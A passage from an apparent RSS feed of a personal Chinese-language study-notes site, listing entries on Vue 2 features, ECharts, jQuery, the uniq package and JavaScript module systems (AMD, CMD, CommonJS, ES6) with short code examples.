对象 适合场景：要绑定多个类名，类名个数确定，类名也确定，但需要动态决定是否要应用样式。
通过修改属性的布尔值来决定是否启用当前样式。
数组 适合场景：要绑定多个类名，类名个数不确定，类名也不确定。
通过向数组中添加元素来增加类名，删除元素来移除类名。
绑定内联样式 对象 CSS 属性名可以用小驼峰式或短横线分隔（用引号括起来）来命名。其中 CSS 属性指是动态值
HTML
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt;  &amp;lt;script src=&amp;#34;https://cdn.bootcdn.net/ajax/libs/vue/2.6.9/vue.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;title&amp;gt;Vue&amp;lt;/title&amp;gt;  &amp;lt;style&amp;gt;  .basic {  width: 100px;  height: 100px;  margin-top: 10px;  border: 1px solid #000;  }   .</description>
    </item>
    
    <item>
      <title>Vue watch</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/watch/</link>
      <pubDate>Wed, 18 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/watch/</guid>
      <description>watch 侦听器，用于侦听 Vue 实例上的数据变动。
HTML
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt;  &amp;lt;script src=&amp;#34;https://cdn.bootcdn.net/ajax/libs/vue/2.6.9/vue.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;title&amp;gt;Vue&amp;lt;/title&amp;gt;  &amp;lt;style&amp;gt;   &amp;lt;/style&amp;gt;  &amp;lt;/head&amp;gt;   &amp;lt;body&amp;gt;  &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;h2&amp;gt;今天天气很{{weather}}&amp;lt;/h2&amp;gt;  &amp;lt;button @click=&amp;#39;handoff&amp;#39;&amp;gt;切换天气&amp;lt;/button&amp;gt;  &amp;lt;h2&amp;gt;{{number.a}}&amp;lt;/h2&amp;gt;  &amp;lt;button @click=&amp;#34;number.a++&amp;#34;&amp;gt;深度监听a&amp;lt;/button&amp;gt;  &amp;lt;h2&amp;gt;{{number.b}}&amp;lt;/h2&amp;gt;  &amp;lt;button @click=&amp;#34;number.b++&amp;#34;&amp;gt;深度监听b&amp;lt;/button&amp;gt;  &amp;lt;/div&amp;gt;   &amp;lt;/body&amp;gt;  &amp;lt;script src=&amp;#34;./js/main.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;/html&amp;gt; JavaScript</description>
    </item>
    
    <item>
      <title>Vue 过滤与排序</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93/%E8%BF%87%E6%BB%A4%E4%B8%8E%E6%8E%92%E5%BA%8F/</link>
      <pubDate>Wed, 18 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93/%E8%BF%87%E6%BB%A4%E4%B8%8E%E6%8E%92%E5%BA%8F/</guid>
      <description>过滤与排序 当用computed和watch都能实现某一个功能的时候，优先使用computed。
过滤 分别用两种方式实现过滤，computed 与watch，推荐使用前者。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;h1&amp;gt;模糊搜索&amp;lt;/h1&amp;gt;  &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; placeholder=&amp;#34;请输入名字&amp;#34; v-model=&amp;#34;keyWord&amp;#34;&amp;gt;  &amp;lt;ul&amp;gt;  &amp;lt;li v-for=&amp;#34;p in filterPersons&amp;#34; :key=&amp;#34;p.id&amp;#34;&amp;gt;  {{p.name}}-{{p.age}}-{{p.sex}}  &amp;lt;/li&amp;gt;  &amp;lt;/ul&amp;gt;  &amp;lt;/div&amp;gt; JavaScrip
watch 实现
var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	keyWord: &amp;#39;&amp;#39;, 	persons: [ 	{ id: &amp;#39;001&amp;#39;, name: &amp;#39;马冬梅&amp;#39;, age: 20, sex: &amp;#39;女&amp;#39; }, 	{ id: &amp;#39;002&amp;#39;, name: &amp;#39;周冬雨&amp;#39;, age: 21, sex: &amp;#39;女&amp;#39; }, 	{ id: &amp;#39;003&amp;#39;, name: &amp;#39;周杰伦 &amp;#39;, age: 22, sex: &amp;#39;男&amp;#39; }, 	{ id: &amp;#39;004&amp;#39;, name: &amp;#39;温兆伦 &amp;#39;, age: 18, sex: &amp;#39;男&amp;#39; }, 	], 	// 用来接受过滤后的结果 	filterPersons: [], 	}, 	methods: {}, 	watch: { 	keyWord: { 	// 初始化 filterPersons 数组 	immediate: true, 	handler(val) { 	// 将过滤后的结果赋给 persons 	this.</description>
    </item>
    
    <item>
      <title>Echarts</title>
      <link>https://yxzi.xyz/mynote/4-specialty/storehouse/echarts/echarts/</link>
      <pubDate>Mon, 16 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/storehouse/echarts/echarts/</guid>
      <description>Echarts ECharts 是一个使用 JavaScript 实现的开源可视化库，兼容性强，底层依赖矢量图形库 ZRender，提供直观，交互丰富，可高度个性化定制的数据可视化图表。
使用 Echarts 的时候，只需要更改配置项即可。</description>
    </item>
    
    <item>
      <title>jQuery</title>
      <link>https://yxzi.xyz/mynote/4-specialty/storehouse/jquery/jquery/</link>
      <pubDate>Mon, 16 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/storehouse/jquery/jquery/</guid>
      <description>jQuery jQuery是一个 JavaScript 的类库，jQuery 有的JavaScript 都有，两者的区别在于用 jQuery 写的代码量更少且功能更大。</description>
    </item>
    
    <item>
      <title>Uniq</title>
      <link>https://yxzi.xyz/mynote/4-specialty/storehouse/uniq/uniq/</link>
      <pubDate>Mon, 16 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/storehouse/uniq/uniq/</guid>
      <description>Uniq ‎用于将数组中的所有重复项删除，并按数组中每个元素的首位字符进行升序
安装 npm install uniq 使用
 // 导入 uniq var uniq = require(&amp;#34;uniq&amp;#34;) // 定义数组 var arr = [199, 9, 3]; // 排序 var result = uniq(arr); // [ 199, 3, 9 ] // 虽然 199 大于 3 和 9，但因为 199 的首位字符为 1，因此，它排在l console.log(result); </description>
    </item>
    
    <item>
      <title>JavaScrip AMD</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/amd/amd/</link>
      <pubDate>Sun, 15 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/amd/amd/</guid>
      <description>AMD 专门用于浏览器端，实现异步加载模块，该规范依赖于 require.js。
不是所有模块都支持 AMD 规范，比如 angular.js，但也可以通过 shim配置来使用angular.js
定义模块 定义没有依赖的模块：
define(function () {  // 暴露模块 	return module; }); 定义有依赖的模块：
// 显式声明依赖注入 define([&amp;#39;module1&amp;#39;, &amp;#39;module2&amp;#39;, &amp;#39;module2&amp;#39;], function (m1Obj, m2Obj, m3Obj) {  // 暴露模块 	return module; }); 导入模块 require([ 	&amp;#39;module1&amp;#39;, 	&amp;#39;module2&amp;#39;, 	&amp;#39;module3&amp;#39;, 	function (m1Obj, m2Obj, m3Obj) { 	// 使用 m1Obj, m2Obj, m3Obj 	}, ]); 实现 使用require.js。</description>
    </item>
    
    <item>
      <title>JavaScrip AMD 实现模块化</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/amd/amd-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</link>
      <pubDate>Sun, 15 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/amd/amd-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</guid>
      <description>AMD 实现模块化 将require.js导入到项目目录./libs/require.js
创建项目结构 ./libs/：第三方模块目录。
./modules/：自定义模块目录。
./libs/jquery.js：第三方模块。
./libs/require.js：第三方模块。
./modules/alerter.js：有依赖的自定义模块。
./modules/dataService.js无依赖的自定义模块。
./main.js：主模块。
./index.html：入口文件。
模块化编码 alerter.js
// 定义无依赖的模块 define(function () { 	var name = &amp;#39;no have dependencies&amp;#39;; 	function fun() { 	return name; 	} 	// 暴露模块的 fun() 	return { fun }; }); dataService.js
// 定义有依赖的模块，该模块依赖 dataService、jquery define([&amp;#39;dataService&amp;#39;, &amp;#39;jquery&amp;#39;], function (dataService, $) { 	var msg = &amp;#39;have dependencies&amp;#39;; 	function showMsg() { 	console.log(msg, dataService.fun()); 	} 	$(&amp;#39;body&amp;#39;).</description>
    </item>
    
    <item>
      <title>JavaScrip Browserify 实现模块化</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/commonjs/browserify-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</link>
      <pubDate>Sun, 15 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/commonjs/browserify-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</guid>
      <description>Browserify 实现模块化 基于本地浏览器端实现模块化，需要用 Browserify来打包。
创建项目结构 ./dist：打包生成的文件目录。
./src：模块目录。
./src/module1.js：自定义模块一。
./src/module2.js：自定义模块二。
./src/module3.js：自定义模块三。
./app.js：主模块。
./index.html：入口文件。
模块化编码 module1.js
// 暴露对象 module.exports = { 	msg: &amp;#39;module one&amp;#39;, 	fun() { 	console.log(this.msg); 	}, }; module2.js
// 暴露函数 module.exports = function () { 	console.log(&amp;#39;module two&amp;#39;); }; module3.js
// 向暴露 2 个函数，1 个数组  exports.f = function () { 	console.log(&amp;#39;modul three f1&amp;#39;); };  exports.f2 = function () { 	console.log(&amp;#39;module three f2&amp;#39;); };  exports.</description>
    </item>
    
    <item>
      <title>JavaScrip CMD</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/cmd/cmd/</link>
      <pubDate>Sun, 15 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/cmd/cmd/</guid>
      <description>CMD 专用于浏览器端，异步加载模块。
惰性加载模块，即使用模块时才会加载。
实现该规范使用Sea.js
定义模块 注意，回调函数中的三个参数require, exports, module必须加上，否则会报错。
定义没有依赖的模块：
define(function (require, exports, module) { 	// 暴露模块，通常用后者 	exports.xxx = value; 	module.exports = value; }); 定义有依赖的模块：
define(function (require, exports, module) { 	// 同步导入模块 	var module2 = require(&amp;#39;./module2&amp;#39;); 	// 异步导入依赖模块 	require.async(&amp;#39;./module3&amp;#39;, function (m3Obj) { 	// 使用 m3Obj 	});  // 暴露模块 	exports.xxx = value; }); 导入模块 define(function (require) { 	var m1 = require(&amp;#39;.</description>
    </item>
    
    <item>
      <title>JavaScrip CMD 实现模块化</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/cmd/cmd-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</link>
      <pubDate>Sun, 15 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/cmd/cmd-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</guid>
      <description>CMD 实现模块化 创建项目结构 ./libs：第三方模块目录。
./libs/sea.js：第三方模块。
./modules：自定义模块目录。
./modules/module1.js：自定义模块一。
./modules/module2.js：自定义模块二。
./modules/module3.js：自定义模块三。
./modules/module4.js：自定义模块四。
modules/main.js：主模块。
./index.html：入口文件
模块化编码 module1.js
// 定义没有依赖的模块 define(function (require, exports, module) { 	var msg = &amp;#39;module1&amp;#39;; 	function fun() { 	return msg; 	} 	// 暴露模块 	module.exports = { fun }; }); module2.js
// 定义没有依赖的模块 define(function (require, exports, module) { 	var msg = &amp;#39;module2&amp;#39;; 	function fun2() { 	console.log(msg); 	} 	// 暴露模块 	module.</description>
    </item>
    
    <item>
      <title>JavaScrip CommonJS</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/commonjs/commonjs/</link>
      <pubDate>Sun, 15 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/commonjs/commonjs/</guid>
      <description>CommonJS 一种为 JS 的表现指定的规范，它希望 JavaScrip 可以运行在任何地方，Node.js采用了这个规范。
一个单独文件就是一个模块，通过require()来同步加载要依赖的模块，然后通过extports或则module.exports来暴露模块的接口。
定义模块 两种方式所暴露的模块都是一个对象。
module.expots 将需要暴露的属性或方法保存到exports对象中。
// ExposedObjects() 将会保存到 exports 对象中，并暴露出去 module.expots = ExposedObjects(){ }; exports.xxx 给exports定义不同的xxx 对象，可以暴露不同属性或方法。
// 不同的对象暴露不同的方法或属性 expots.obj = ExposedObjects(){ }; expots.obj2 = ExposedObjects2(){ } expots.obj3 = ExposedObjects3(){ } 导入模块 // 导入第三方模块 require(&amp;#39;jquery&amp;#39;); // 导入自定义模块 require(&amp;#39;modules.js&amp;#39;); 实现 服务器端 直接使用 Node.js，加载模块时是同步加载，这会导致阻塞（等待），但因为是在服务器端，影响也不是很大，无非是加载的时间比较长。
浏览器端 加载模块时是同步加载，也会导致阻塞，且因为是在浏览器端，加载的时间非常长，用户体验不好（页面白屏），因此，我们需要将模块进行编译打包，以此来缩短加载时间。
打包工具：Browserify.</description>
    </item>
    
    <item>
      <title>JavaScrip ES6 Module</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/es6-module/es6-module/</link>
      <pubDate>Sun, 15 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/es6-module/es6-module/</guid>
      <description>ES6 Module 配置 package.json 项目或模块的描述文件。
{  &amp;#34;name&amp;#34;: &amp;#34;es6-module&amp;#34;,  &amp;#34;version&amp;#34;: &amp;#34;1.0.0&amp;#34;,  &amp;#34;dependencies&amp;#34;: {  &amp;#34;jquery&amp;#34;: &amp;#34;^3.6.0&amp;#34;,  &amp;#34;uniq&amp;#34;: &amp;#34;^1.0.1&amp;#34;  },  &amp;#34;devDependencies&amp;#34;: {  &amp;#34;@babel/cli&amp;#34;: &amp;#34;^7.17.10&amp;#34;,  &amp;#34;@babel/core&amp;#34;: &amp;#34;^7.17.12&amp;#34;,  &amp;#34;@babel/preset-env&amp;#34;: &amp;#34;^7.17.12&amp;#34;,  &amp;#34;browserify&amp;#34;: &amp;#34;^17.0.0&amp;#34;  } } 安装 babel/cli Babel 自带的一个内置的 CLI 命令行工具，可通过命令行编译文件。
npm install --save-dev @babel/core @babel/cli 其中@babel/core是 babel 的核心库。
babel/preset-env 一个智能预设，允许您使用最新的JavaScript，而无需微观管理目标环境需要哪些语法转换（以及可选的浏览器 polyfills）
npm install --save-dev @babel/preset-env 安装 Browserify 用来打包编译模块。
npm install -g browserify 配置 babel.</description>
    </item>
    
    <item>
      <title>JavaScrip ES6 模块化规范</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/es6-module/es6-%E6%A8%A1%E5%9D%97%E5%8C%96%E8%A7%84%E8%8C%83/</link>
      <pubDate>Sun, 15 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/es6-module/es6-%E6%A8%A1%E5%9D%97%E5%8C%96%E8%A7%84%E8%8C%83/</guid>
      <description>ES6 模块化规范 在 ES6 之前，社区制定了一些模块加载方案，最主要的有 CommonJS 和 AMD 两种。前者用于服务器，后者用于浏览器。
ES6 在语言标准的层面上，实现了模块功能，而且实现得相当简单，完全可以取代 CommonJS 和 AMD 规范，成为浏览器和服务器通用的模块解决方案。
依赖模块需要借助 Browserify来打包。
暴露模块 使用export来暴露模块，它用于规定模块的对外接口。
分别暴露 export function fun1() { 	console.log(&amp;#39;fun1 module1&amp;#39;); } export function fun11() { 	console.log(&amp;#39;fun11 module1&amp;#39;); } export var arr = [9999, 34, 5, 6, 7565, 757, 6]; 统一暴露 function fun2() { 	console.log(&amp;#39;fun2 module2&amp;#39;); } function fun22() { 	console.log(&amp;#39;fun2 module2&amp;#39;); } export { fun2, fun22 }; 默认暴露 使用默认暴露，可以暴露任意数据类型；暴露的是什么数据类型，接收到的就是什么数据类型；还可以使用任意的变量来接收。
在同一个模块中，只允许用export default 暴露一次。</description>
    </item>
    
    <item>
      <title>JavaScrip NodeJs 实现模块化</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/commonjs/nodejs-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</link>
      <pubDate>Sun, 15 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/commonjs/nodejs-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</guid>
      <description>NodeJs 实现模块化 基于node.js服务器端实现模块化。
创建项目结构 ./modules：模块目录。
./modules/module1.js：自定义模块一。
./modules/module2.js：自定义模块二。
./modules/module3.js：自定义模块三。
./app.js：主模块。
安装模块 安装 uniq
npm install uniq 模块化编码 module1.js
// 暴露对象 module.exports = { 	msg: &amp;#39;module one&amp;#39;, 	fun() { 	console.log(this.msg); 	}, }; module2.js
// 暴露函数 module.exports = function () { 	console.log(&amp;#39;module two&amp;#39;); }; module3.js
// 暴露 2 个函数，1 个数组 exports.f = function () { 	console.log(&amp;#39;modul three f1&amp;#39;); };  exports.f2 = function () { 	console.log(&amp;#39;module three f2&amp;#39;); };  exports.</description>
    </item>
    
    <item>
      <title>JavaScrip 模块</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/%E6%A8%A1%E5%9D%97/</link>
      <pubDate>Sun, 15 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/%E6%A8%A1%E5%9D%97/</guid>
      <description>模块 向外提供特定功能的 JavaScrip 文件，一个 JavaScrip 文件就是一个模块。</description>
    </item>
    
    <item>
      <title>JavaScrip 模块化</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/%E6%A8%A1%E5%9D%97%E5%8C%96/</link>
      <pubDate>Sun, 15 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/%E6%A8%A1%E5%9D%97%E5%8C%96/</guid>
      <description>模块化 将一个复杂的 JavaScrip程序依据一定的规范封装成几个块（文件），并组合在一起的过程就是模块化。块的内部数据是私有的，只向外部暴露了一些接口与外部其他模块通信。
作用  降低复杂度。 提高解耦性，降低耦合度。 部署方便，功能点明确。  优点  避免变量污染。 更好的分离，按需加载。 更高的复用性。 更高的可维护性。  常见的模块化标准 CommonJS.
ES6 Module.
AMD.
CMD.</description>
    </item>
    
    <item>
      <title>JavaScrip 模块化的发展史</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/%E6%A8%A1%E5%9D%97%E5%8C%96%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2/</link>
      <pubDate>Sun, 15 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/%E6%A8%A1%E5%9D%97%E5%8C%96%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2/</guid>
      <description>模块化的发展史 全局函数模式 将不同的函数封装成不同的全局函数。
缺点
变量非常不安全，会直接污染全局中的变量。
JavaScrip One
// msg 变量并不安全，会被其他文件中的 js 代码修改。 var msg = &amp;#39;全局函数模式&amp;#39;; function fun() { 	console.log(msg); } JavaScrip Two
fun() msg = &amp;#39;全局中的 msg 被其他文件中的 js 代码修改了&amp;#39; fun() 命名空间 将全局中的变量定义到一个对象中，以减少 Global 上的变量。
缺点
本质是对象，依旧可以通过对象去修改该对象中的变量，变量依旧不安全。
JavaScrip One
var obj = { 	// 将全局中的变量定义为对象的属性，以减少全局中的变量 	msg: &amp;#39;命名空间模式&amp;#39;, 	fun() { 	console.log(this.msg); 	}, }; JavaScrip Two
obj.fun() obj.msg = &amp;#39;对象中的 msg 被其他文件中的 js 代码修改了&amp;#39; obj.fun() IIFE 模式 将变量和函数定义到立即执行函数内部，并将方法暴露给 window，以一个匿名闭包（将一个模块暴露给 window 对象，然后在其其他模块中用 window 对象来访问这个这个模块）的方式实现了模块化。</description>
    </item>
    
    <item>
      <title>Vue data</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/data/</link>
      <pubDate>Sun, 15 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/data/</guid>
      <description>data data 中的数据，不是直接在 Vue 实例中，而是在_data中，而_data在 Vue 实例中。
data 中的数据，Vue 使用了数据代理和数据劫持，从而实现了数据响应式。
书写方式 对象式 Vue 实例中使用对象式和函数式都可以。
data: {  name: &amp;#39;Vue 实例&amp;#39;, }, 函数式 在组件实例中必须使用函数式，否则会报错。
data() {  return {  name: &amp;#39;组件实例&amp;#39;,  }; }, </description>
    </item>
    
    <item>
      <title>Vue methods</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/methods/</link>
      <pubDate>Sun, 15 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/methods/</guid>
      <description>methods methods 中的函数，其 this 都指向 Vue 实例或者组件实例对象。
任何 Vue 实例中的方法，只能使用普通函数，不能使用箭头函数，否则箭头函数中的 this 指向就不再是 Vue，而是 window。
var vm = new Vue({ 	el: &amp;#39;#root&amp;#39;, 	data: { 	name: &amp;#39;China&amp;#39;, 	},  // 方法 	methods: {  // 只能使用普通函数 	showInfo() { 	console.log(this); 	},  // 不能使用箭头函数  showInfo:()=&amp;gt; { 	console.log(this); 	}, 	}, 	}, }); Vue.config.productionTip = false; </description>
    </item>
    
    <item>
      <title>Vue 键盘事件</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E4%BA%8B%E4%BB%B6/%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6/</link>
      <pubDate>Sun, 15 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E4%BA%8B%E4%BB%B6/%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6/</guid>
      <description>键盘事件 @键盘事件.按键key值
Vue 中常用的按键别名：
 回车：enter 删除：delete 退出：esc 空格：space 换行：tab（必须配合keydow使用，如果使用 keyup，那么按下tab 后，当前元素会失去焦点，则元素的keyup 事件则不会触发）  Vue 未提供别名的按键，可以使用按键原始的 key 值去绑定，但要注意，部分按键的key 值默认是大坨峰命名，需要转为短横线命名，比如CapsLock。
&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; @keydown.Caps-Lock=&amp;#39;showInfo&amp;#39;&amp;gt; 系统修饰键（用法特殊）： ctrl、 alt、 shift、 meta。
 配合 keyup 使用：按下修饰键的同时，再按下其他健，随后只释放其他健，事件才被触发。 配合 keydown 使用：正常触发事件。  自定义KeyCode
使用 Vue.confing.keyCode.自定义键名 = KeyCode
键盘事件连写
表示按下 ctrl + y才能触发事件。
&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; @keyup.ctrl.y=&amp;#39;showInfo&amp;#39;&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue MVVM</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/mvvm/</link>
      <pubDate>Sat, 14 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/mvvm/</guid>
      <description>MVVM 双向数据绑定，数据影响视图，视图影响数据
M：模型，指 data 中的数据。
V：视图，指模板。
VM：视图模型，指 Vue 实例对象。
data 中的所有属性，最后都出现在了 Vue 实例上。
vue 实例上的所有属性，以及 Vue 原型上的所有属性，在 Vue 模板中国都可以直接使用。</description>
    </item>
    
    <item>
      <title>Vue set</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E5%85%A8%E5%B1%80-api/set/</link>
      <pubDate>Sat, 14 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E5%85%A8%E5%B1%80-api/set/</guid>
      <description>set 给响应式对象添加一个属性，并且这个新属性是响应式的，因此，且会触发视图的更新。
该对象必须是响应式对象，因为 Vue 无法探测普通的新增属性。
该对象不能是 Vue 实例，或者 Vue 实例的根数据对象：data、。
如果响应式对象为 array，则第二个参数为 index.</description>
    </item>
    
    <item>
      <title>Vue 插值语法</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8F%92%E5%80%BC%E8%AF%AD%E6%B3%95/</link>
      <pubDate>Sat, 14 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8F%92%E5%80%BC%E8%AF%AD%E6%B3%95/</guid>
      <description>插值语法 用于解析元素包含的内容，一般使用{{name}}来进行插值，其中name必须是JavaScrip 表达式，且可以直接读取data中的所有数据。
&amp;lt;!-- 插值语法 --&amp;gt; &amp;lt;h1&amp;gt;hello！{{name}}&amp;lt;/h1&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue 数据代理</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%90%86/</link>
      <pubDate>Sat, 14 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%90%86/</guid>
      <description>数据代理 通过一个对象代理对另一个对象中的属性的操作（读/写）.
在 Vue 中，通过 vm 来代理 data 中的属性操作，使我们更加方便的操作 data 中的数据。
原理  通过definProperty() 将data中所有的属性添加到 vm 上。 为每一个添加到 vm 上的属性，都定义一个getter()和setter()。 因此，每当我们修改或访问 vm 中的属性，都会调用其属性所对应的getter() 和setter()， 最后，在getter() 和setter()内部来访问或修改data中的属性值。  // 通过 obj2 访问或修改 obj1 中的 x  var obj = { x: 100 }; var obj2 = { y: 200 };  // 给 obj2 定义一个新的属性 x Object.defineProperty(obj2, &amp;#39;x&amp;#39;, { 	get() { 	// 当访问 obj2.x 时，返回 100，并将 100 赋给 obj2.x， 	return obj.</description>
    </item>
    
    <item>
      <title>Vue scoped</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/scoped/</link>
